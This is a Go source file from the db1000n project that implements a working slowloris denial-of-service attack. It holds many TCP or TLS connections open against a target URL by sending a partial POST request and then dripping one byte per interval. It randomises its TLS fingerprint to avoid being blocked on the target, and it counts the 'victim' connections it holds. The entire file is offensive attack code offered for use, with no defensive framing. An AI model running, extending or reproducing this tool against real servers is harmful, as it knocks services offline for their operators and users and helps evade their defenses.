// Package slowloris [inspired by https://github.com/valyala/goloris]
package slowloris

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"strings"
	"time"

	utls "github.com/refraction-networking/utls"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/utils/metrics"
)

// Config holds all the configuration values for slowloris
type Config struct {
	ContentLength    int           // The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size
	DialWorkersCount int           // The number of workers simultaneously busy with opening new TCP connections
	RampUpInterval   time.Duration // Interval between new connections' acquisitions for a single dial worker (see DialWorkersCount)
	SleepInterval    time.Duration // Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout
	Duration         time.Duration // Duration
	Path             string        // Target Path. Http POST must be allowed for this Path
	HostHeader       string        // Host header value in case it is different than the hostname in Path
	ClientID         string
}

// SlowLoris is a main logic struct for the package
type SlowLoris struct {
	Config *Config
}

const sharedReadBufSize = 4096

var (
	sharedReadBuf  = make([]byte, sharedReadBufSize)
	sharedWriteBuf = []byte("A")
)

// Start starts a slowloris job with specific configuration
func Start(stopChan chan bool, logger *zap.Logger, config *Config) error {
	s := &SlowLoris{
		Config: config,
	}

	targetURL, err := url.Parse(config.Path)
	if err != nil {
		logger.Debug("cannot parse path", zap.String("path", config.Path), zap.Error(err))

		return err
	}

	targetHostPort := targetURL.Host
	if !strings.Contains(targetHostPort, ":") {
		port := "80"
		if targetURL.Scheme == "https" {
			port = "443"
		}

		targetHostPort = net.JoinHostPort(targetHostPort, port)
	}

	host := targetURL.Host
	if len(config.HostHeader) > 0 {
		host = config.HostHeader
	}

	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
		targetURL.RequestURI(), host, config.ContentLength))
	dialWorkersLaunchInterval := config.RampUpInterval / time.Duration(config.DialWorkersCount)
	activeConnectionsCh := make(chan int, config.DialWorkersCount)

	go s.activeConnectionsCounter(activeConnectionsCh)

	for i := 0; i < config.DialWorkersCount; i++ {
		go s.dialWorker(stopChan, logger, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
		time.Sleep(dialWorkersLaunchInterval)
	}

	time.Sleep(config.Duration)

	return nil
}

func (s SlowLoris) dialWorker(stopChan chan bool, logger *zap.Logger, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetURI *url.URL, requestHeader []byte) {
	isTLS := targetURI.Scheme == "https"

	for {
		select {
		case <-stopChan:
			return
		default:
			time.Sleep(config.RampUpInterval)

			if conn := s.dialVictim(logger, targetHostPort, isTLS); conn != nil {
				go s.doLoris(logger, config, targetHostPort, conn, activeConnectionsCh, requestHeader)
			}
		}
	}
}

func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
	var connectionsCount int
	for n := range ch {
		connectionsCount += n
		log.Printf("Holding %d connections", connectionsCount)
	}
}

func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool) io.ReadWriteCloser {
	// TODO: add support for dialing the Path via a random proxy from the given pool.
	conn, err := net.Dial("tcp", hostPort)
	if err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("couldn't establish connection", zap.String("addr", hostPort), zap.Error(err))

		return nil
	}

	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		// This should never happen
		return nil
	}

	const bufferSize = 128

	if err = tcpConn.SetReadBuffer(bufferSize); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot shrink TCP read buffer", zap.Error(err))

		return nil
	}

	if err = tcpConn.SetWriteBuffer(bufferSize); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot shrink TCP write buffer", zap.Error(err))

		return nil
	}

	if err = tcpConn.SetLinger(0); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot disable TCP lingering", zap.Error(err))

		return nil
	}

	if !isTLS {
		return tcpConn
	}

	// Use custom TLS connection to avoid being blocked on the target resource
	// by the SSL fingerprinting (https://ja3er.com/about.html)
	tlsConn := utls.UClient(tcpConn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)

	if err = tlsConn.Handshake(); err != nil {
		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
		conn.Close()
		logger.Debug("couldn't establish tls connection", zap.String("addr", hostPort), zap.Error(err))

		return nil
	}

	return tlsConn
}

func (s SlowLoris) doLoris(logger *zap.Logger, config *Config, destinationHostPort string, conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHeader []byte) {
	defer conn.Close()

	if _, err := conn.Write(requestHeader); err != nil {
		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
		logger.Debug("cannot write requestHeader", zap.ByteString("header", requestHeader), zap.Error(err))

		return
	}

	activeConnectionsCh <- 1
	defer func() { activeConnectionsCh <- -1 }()

	readerStopCh := make(chan int, 1)
	go s.nullReader(logger, conn, readerStopCh)

	for i := 0; i < config.ContentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(config.SleepInterval):
		}

		if _, err := conn.Write(sharedWriteBuf); err != nil {
			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
			logger.Debug("cannot write bytes", zap.Int("current", i), zap.Int("total", config.ContentLength), zap.Error(err))

			return
		}

		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
	}
}

func (s SlowLoris) nullReader(logger *zap.Logger, conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()

	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		logger.Debug("error when reading server response", zap.Error(err))
	} else {
		logger.Debug("unexpected response read from server", zap.ByteString("buffer", sharedReadBuf[:n]))
	}
}
